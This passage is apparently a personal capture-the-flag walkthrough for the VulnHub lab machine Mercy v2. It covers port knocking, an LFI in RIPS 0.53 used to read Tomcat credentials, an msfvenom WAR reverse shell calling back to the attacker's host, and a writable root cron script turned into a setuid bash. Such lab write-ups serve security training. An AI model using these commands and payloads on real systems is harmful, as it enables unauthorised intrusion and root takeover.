5. View files
	- `configprint`
		![](Pasted%20image%2020220208001316.png)
		- `knockd.conf`
	- `config`
		![](Pasted%20image%2020220208002615.png)
		
		- Knock Sequence:
			- `159,27391,4`
			- `17301,28504,9999`

## Port Knocking 

1. Port Knock

	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot]
	└─# knock -v $ip 159 27391 4
	hitting tcp 192.168.110.19:159
	hitting tcp 192.168.110.19:27391
	hitting tcp 192.168.110.19:4
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot]
	└─# knock -v $ip 17301 28504 9999
	hitting tcp 192.168.110.19:17301
	hitting tcp 192.168.110.19:28504
	hitting tcp 192.168.110.19:9999
	```

2. Check for newly opened ports

	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot]
	└─# nmap $ip -p-
	Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-08 00:30 +08
	Stats: 0:00:06 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
	Parallel DNS resolution of 1 host. Timing: About 0.00% done
	Nmap scan report for 192.168.110.19
	Host is up (0.00042s latency).
	Not shown: 65525 closed tcp ports (reset)
	PORT     STATE SERVICE
	22/tcp   open  ssh
	53/tcp   open  domain
	80/tcp   open  http
	110/tcp  open  pop3
	139/tcp  open  netbios-ssn
	143/tcp  open  imap
	445/tcp  open  microsoft-ds
	993/tcp  open  imaps
	995/tcp  open  pop3s
	8080/tcp open  http-proxy
	MAC Address: 08:00:27:CC:62:BC (Oracle VirtualBox virtual NIC)

	Nmap done: 1 IP address (1 host up) scanned in 18.76 seconds
	```

	- `TCP/80`
	- `TCP/22`

## Recon on the newly opened ports 

1. nmap complete scan

	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot]
	└─# nmap $ip -A -sV -sC -p22,80 -oN ../scans/new_ports.txt
	Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-08 00:36 +08
	Nmap scan report for 192.168.110.19
	Host is up (0.00051s latency).

	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   1024 93:64:02:58:62:0e:e7:85:50:d9:97:ea:8d:01:68:f6 (DSA)
	|   2048 13:77:33:9a:49:c0:51:dc:8f:fb:c8:33:17:b2:05:71 (RSA)
	|   256 a2:25:3c:cf:ac:d7:0f:ae:2e:8c:c5:14:c4:65:c1:59 (ECDSA)
	|_  256 33:12:1b:6a:98:da:ea:9d:8c:09:94:ed:44:8d:4e:5b (ED25519)
	80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
	| http-robots.txt: 2 disallowed entries 
	|_/mercy /nomercy
	|_http-title: Site doesn't have a title (text/html).
	|_http-server-header: Apache/2.4.7 (Ubuntu)
	MAC Address: 08:00:27:CC:62:BC (Oracle VirtualBox virtual NIC)
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	Device type: general purpose
	Running: Linux 3.X|4.X
	OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
	OS details: Linux 3.2 - 4.9
	Network Distance: 1 hop
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	TRACEROUTE
	HOP RTT     ADDRESS
	1   0.51 ms 192.168.110.19

	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 21.34 seconds
	```

2. Directory enumerate `TCP/80 - HTTP`

	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2]
	└─# ffuf -u http://$ip:80/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php'

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.110.19:80/FUZZ
	 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
	 :: Extensions       : .html .txt .php 
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	________________________________________________

	.htpasswd.txt           [Status: 403, Size: 294, Words: 21, Lines: 11]
	.htpasswd.php           [Status: 403, Size: 294, Words: 21, Lines: 11]
	index.html              [Status: 200, Size: 90, Words: 9, Lines: 6]
	robots.txt              [Status: 200, Size: 50, Words: 4, Lines: 4]
	server-status           [Status: 403, Size: 294, Words: 21, Lines: 11]
	time                    [Status: 200, Size: 79, Words: 15, Lines: 3]
	:: Progress: [18460/18460] :: Job [1/1] :: 2255 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
	```

	- `time`
	- `robots.txt`

## TCP/80 (HTTP) - RIPS 0.53 LFI Exploit

1. View enumerated directories
	- `time`
		![](Pasted%20image%2020220208004832.png)
	- `robots.txt`

		```
		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot]
		└─# curl -s http://$ip/robots.txt
		User-agent: *
		Disallow: /mercy
		Disallow: /nomercy
		```

	- `/mercy/index`

		```
		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot]
		└─# curl -s http://$ip/mercy/index
		Welcome to Mercy!

		We hope you do not plead for mercy too much. If you do, please help us upgrade our website to allow our visitors to obtain more than just the local time of our system.
		```

	- `/nomercy`
		![](Pasted%20image%2020220208005038.png)
		- `RIPS 0.53`
2. Search exploits for `RIPS 0.53`

	| Exploit Title                              | Path                  |

	| ------------------------------------------ | --------------------- |

	| RIPS 0.53 - Multiple Local File Inclusions | php/webapps/18660.txt |

3. Try `php/webapps/18660.txt`
	1. POC

		```
		http://localhost/rips/windows/code.php?file=../../../../../../etc/passwd
		```

	2. Check for vulnerability
		![](Pasted%20image%2020220208010019.png)
	3. Fuzz for files that can lead to RCE

		```
		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/exploit]
		└─# ffuf -u http://$ip/nomercy/windows/code.php?file=../../../../../../..FUZZ -w /usr/share/wordlists/LFI/file_inclusion_linux.txt  -fw 14,5
		```

		- Could not find any files that could lead to RCE
	4. At `TCP/8080 - HTTP`, tomcat is running, this will lead us to RCE
		- Why is it useful?
			1. We can enumerate tomcat files & locate `tomcat-usr.xml` which contains credentials via the LFI exploit
			2. If are able to include `tomcat-usr.xml`, we can login & upload a reverse shell at tomcat.
	5. Tomcat file directory structure

		```
		/etc/tomcat7/
		├── Catalina
		│   └── localhost
		│       ├── ROOT.xml
		│       └── solr.xml -> ../../../solr/solr-tomcat.xml
		├── catalina.properties
		├── context.xml
		├── logging.properties
		├── policy.d
		│   ├── 01system.policy
		│   ├── 02debian.policy
		│   ├── 03catalina.policy
		│   ├── 04webapps.policy
		│   ├── 05solr.policy -> /etc/solr/tomcat.policy
		│   └── 50local.policy
		├── server.xml
		├── tomcat-users.xml 	 <------------ what we want
		└── web.xml
		
		/var/lib/tomcat7
		├── common
		│   └── classes
		├── conf -> /etc/tomcat7 <------------ what we want
		├── logs -> ../../log/tomcat7
		├── server
		│   └── classes
		├── shared
		│   └── classes
		├── webapps
		│   └── ROOT
		│       ├── index.html
		│       └── META-INF
		│           └── context.xml
		└── work -> ../../cache/tomcat7
		```

		- `/var/lib/tomcat7/conf/tomcat-users.xml`
		- `/etc/tomcat7/tomcat-users.xml`
		- [Good explanation](https://askubuntu.com/a/314614) of tomcat directory structure
	6. Visit `http://192.168.110.19:8080/index.html` again
		![](Pasted%20image%2020220208020311.png)
		- `/etc/tomcat7/tomcat-users.xml`
	7. Include `/etc/tomcat7/tomcat-users.xml`  
		![](Pasted%20image%2020220208024547.png)
		- thisisasuperduperlonguser:heartbreakisinevitable
		- fluffy:freakishfluffybunny

## TCP/8080 (HTTP) - Tomcat (Upload Reverse Shell)

1. Proceed to `http://192.168.110.19:8080/manager/html` 
2. Login w/ thisisasuperduperlonguser:heartbreakisinevitable 
	![](Pasted%20image%2020220208023106.png)
3. Create our WAR reverse shell payload
	1. Create WAR reverse shell 

		```
		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/exploit]
		└─# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.110.4 LPORT=4444 -f war -o rev86.war
		```

	2. Find out the jsp file to execute our reverse shell

		```
		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/exploit]
		└─# jar -xvf rev86.war
		Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
		  created: META-INF/
		 inflated: META-INF/MANIFEST.MF
		  created: WEB-INF/
		 inflated: WEB-INF/web.xml
		 inflated: jfzomlykmswjkh.jsp
		```

		- `jfzomlykmswjkh.jsp`
	3. Deploy `rev86.war`
	4. Execute reverse shell at 

		```
		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2]
		└─# curl http://192.168.110.19:8080/rev86/jfzomlykmswjkh.jsp
		```

		![](Pasted%20image%2020220208024203.png)

4. Obtain `tomcat7` shell
	![](Pasted%20image%2020220208023914.png)
5. Local Flag

	```
	cd /   
	cat local.txt
	Plz have mercy on me! :-( :-(
	```

# Privilege Escalation

## Fluffy - Via Creds Found

1. Earlier we found fluffy's creds at `tomcat-users.xml`, switch to fluffy w/ fluffy:freakishfluffybunny

	```
	tomcat7@MERCY:/usr/local$ su fluffy
	Password: 
	Added user fluffy.

	$ id
	uid=1003(fluffy) gid=1003(fluffy) groups=1003(fluffy)
	```

## Root - Via Cronjob

1. View files in fluffy home directory

	```
	fluffy@MERCY:~$ find $(pwd)
	/home/fluffy
	/home/fluffy/.gnupg
	/home/fluffy/.gnupg/trustdb.gpg
	/home/fluffy/.gnupg/pubring.gpg
	/home/fluffy/.gnupg/gpg.conf
	/home/fluffy/.bash_history
	/home/fluffy/.ssh
	/home/fluffy/.ssh/authorized_keys
	/home/fluffy/.private
	/home/fluffy/.private/secrets
	/home/fluffy/.private/secrets/backup.save
	/home/fluffy/.private/secrets/timeclock
	/home/fluffy/.private/secrets/.secrets
	fluffy@MERCY:~$ 
	```

	- `/.private/secrets`
2. View files in `/.private/secrets`

	```
	fluffy@MERCY:~/.private/secrets$ ls -la
	total 20
	drwxr-xr-x 2 fluffy fluffy 4096 Nov 20  2018 .
	drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 ..
	-rwxr-xr-x 1 fluffy fluffy   37 Nov 20  2018 backup.save
	-rw-r--r-- 1 fluffy fluffy   12 Nov 20  2018 .secrets
	-rwxrwxrwx 1 root   root    222 Nov 20  2018 timeclock
	fluffy@MERCY:~/.private/secrets$ 
	```

	- `timelock` writable
3. Snoop processes to see the cronjob being executed

	```
	tomcat7@MERCY:/tmp$ ./pspy	
	./pspy
	pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


		 ██▓███    ██████  ██▓███ ▓██   ██▓
		▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
		▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
		▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
		▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
		▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
		░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
		░░       ░  ░  ░  ░░       ▒ ▒ ░░  
					   ░           ░ ░     
								   ░ ░     

	Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
	Draining file system events due to startup...
	done
	2022/02/08 11:33:43 CMD: UID=0    PID=9      | 
	2022/02/08 11:33:43 CMD: UID=0    PID=88     | 
	2022/02/08 11:33:43 CMD: UID=0    PID=87     | 
	SNIP
	2022/02/08 11:36:01 CMD: UID=0    PID=23347  | CRON 
	2022/02/08 11:36:01 CMD: UID=0    PID=23349  | bash /home/fluffy/.private/secrets/timeclock 
	2022/02/08 11:36:01 CMD: UID=0    PID=23348  | /bin/sh -c bash /home/fluffy/.private/secrets/timeclock 
	2022/02/08 11:36:33 CMD: UID=0    PID=23364  | /bin/bash /sbin/dhclient-script 
	2022/02/08 11:36:33 CMD: UID=0    PID=23361  | /bin/bash /sbin/dhclient-script 
	2022/02/08 11:36:33 CMD: UID=0    PID=23365  | 
	2022/02/08 11:36:33 CMD: UID=0    PID=23373  | /bin/sh /usr/sbin/invoke-rc.d smbd reload 
	2022/02/08 11:36:33 CMD: UID=0    PID=23372  | /bin/sh /usr/sbin/invoke-rc.d smbd reload 
	2022/02/08 11:36:33 CMD: UID=0    PID=23371  | /bin/sh /usr/sbin/invoke-rc.d smbd reload 
	2022/02/08 11:36:33 CMD: UID=0    PID=23377  | xargs 
	2022/02/08 11:36:33 CMD: UID=0    PID=23376  | 
	2022/02/08 11:36:33 CMD: UID=0    PID=23375  | /bin/sh /usr/sbin/invoke-rc.d smbd reload 
	2022/02/08 11:36:33 CMD: UID=0    PID=23381  | /bin/sh /usr/sbin/invoke-rc.d smbd reload 
	2022/02/08 11:36:33 CMD: UID=0    PID=23380  | /bin/sh /usr/sbin/invoke-rc.d smbd reload 
	2022/02/08 11:36:33 CMD: UID=0    PID=23379  | /bin/sh /usr/sbin/invoke-rc.d smbd reload 
	2022/02/08 11:36:33 CMD: UID=0    PID=23384  | grep -q  start/ 
	2022/02/08 11:36:33 CMD: UID=0    PID=23383  | status smbd 
	2022/02/08 11:36:33 CMD: UID=0    PID=23388  | tr -d ) 
	2022/02/08 11:36:33 CMD: UID=0    PID=23387  | awk {print $3} 
	2022/02/08 11:36:33 CMD: UID=0    PID=23386  | initctl version 
	2022/02/08 11:36:33 CMD: UID=0    PID=23385  | /bin/sh /usr/sbin/invoke-rc.d smbd reload 
	2022/02/08 11:36:33 CMD: UID=0    PID=23389  | dpkg --compare-versions 1.12.1 ge 0.9.7 
	2022/02/08 11:36:33 CMD: UID=0    PID=23391  | grep -q ^  start on 
	2022/02/08 11:36:33 CMD: UID=0    PID=23390  | initctl show-config -e smbd 
	2022/02/08 11:36:33 CMD: UID=0    PID=23396  | /bin/sh /sbin/resolvconf -a eth0.dhclient 
	2022/02/08 11:36:33 CMD: UID=0    PID=23395  | /bin/bash /sbin/dhclient-script 
	2022/02/08 11:36:33 CMD: UID=0    PID=23394  | smbd -F 
	2022/02/08 11:36:33 CMD: UID=0    PID=23399  | sed -e s/[[:blank:]]\+$// -e /^$/d 
	2022/02/08 11:36:33 CMD: UID=0    PID=23398  | sed -e s/#.*$// -e s/[[:blank:]]\+$// -e s/^[[:blank:]]\+// -e s/[[:blank:]]\+/ /g -e /^nameserver/!b ENDOFCYCLE -e s/$/ / -e s/\([:. ]\)0\+/\10/g -e s/\([:. ]\)0\([123456789abcdefABCDEF][[:xdigit:]]*\)/\1\2/g -e /::/b ENDOFCYCLE; s/ \(0[: ]\)\+/ ::/ -e /::/b ENDOFCYCLE; s/:\(0[: ]\)\+/::/ -e : ENDOFCYCLE - 
	2022/02/08 11:36:33 CMD: UID=0    PID=23397  | /bin/sh /sbin/resolvconf -a eth0.dhclient 
	2022/02/08 11:39:01 CMD: UID=0    PID=23407  | CRON 
	2022/02/08 11:39:01 CMD: UID=0    PID=23406  | CRON 
	2022/02/08 11:39:01 CMD: UID=0    PID=23410  | bash /home/fluffy/.private/secrets/timeclock 
	2022/02/08 11:39:01 CMD: UID=0    PID=23409  | CRON 
	2022/02/08 11:39:01 CMD: UID=0    PID=23408  | /bin/sh -c bash /home/fluffy/.private/secrets/timeclock 
	2022/02/08 11:39:01 CMD: UID=0    PID=23414  | php5 -c /etc/php5/apache2/php.ini -d error_reporting='~E_ALL' -r print ini_get("session.gc_maxlifetime"); 
	2022/02/08 11:39:01 CMD: UID=0    PID=23412  | /bin/sh -e /usr/lib/php5/maxlifetime 
	2022/02/08 11:39:01 CMD: UID=0    PID=23417  | /bin/sh /usr/lib/php5/sessionclean /var/lib/php5 24 
	2022/02/08 11:39:01 CMD: UID=0    PID=23420  | xargs -i touch -c {} 
	2022/02/08 11:39:01 CMD: UID=0    PID=23419  | awk -- { if (NR > 1) { print $9; } } 
	2022/02/08 11:39:01 CMD: UID=0    PID=23418  | /usr/bin/lsof -w -l +d /var/lib/php5 
	2022/02/08 11:39:01 CMD: UID=0    PID=23421  | /usr/bin/lsof -w -l +d /var/lib/php5 
	```

	- 2022/02/08 11:36:01: 
		- `/bin/sh -c bash /home/fluffy/.private/secrets/timeclock`
	- 2022/02/08 11:39:01
		- `/bin/sh -c bash /home/fluffy/.private/secrets/timeclock `
	- `timeclock` is executed by root cronjob every 3 minutes
4. Replace `timeclock` w/ a script to create a root shell

	```
	fluffy@MERCY:~/.private/secrets$ printf '#!/bin/bash\n\ncp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\n' > timeclock;
	```

5. Wait for cronjob to execute
6. Root shell obtained
	![](Pasted%20image%2020220208034639.png)
7. Root Flag

	```
	rootbash-4.3# cat author-secret.txt proof.txt 
	Hi! Congratulations on being able to root MERCY.

	The author feels bittersweet about this box. On one hand, it was a box designed as a dedication to the sufferance put through by the Offensive Security team for PWK. I thought I would pay it forward by creating a vulnerable machine too. This is not meant to be a particularly difficult machine, but is meant to bring you through a good number of enumerative steps through a variety of techniques.

	The author would also like to thank a great friend who he always teases as "plead for mercy". She has been awesome. The author, in particular, appreciates her great heart, candour, and her willingness to listen to the author's rants and troubles. The author will stay forever grateful for her presence. She never needed to be this friendly to the author.

	The author, as "plead for mercy" knows, is terrible at any sort of dedication or gifting, and so the best the author could do, I guess, is a little present, which explains the hostname of this box. (You might also have been pleading for mercy trying to root this box, considering its design.)

	You'll always be remembered, "plead for mercy", and Offensive Security, for making me plead for mercy!

	Congratulations, once again, for you TRIED HARDER!

	Regards,
	The Author
	Congratulations on rooting MERCY. :-)
	```
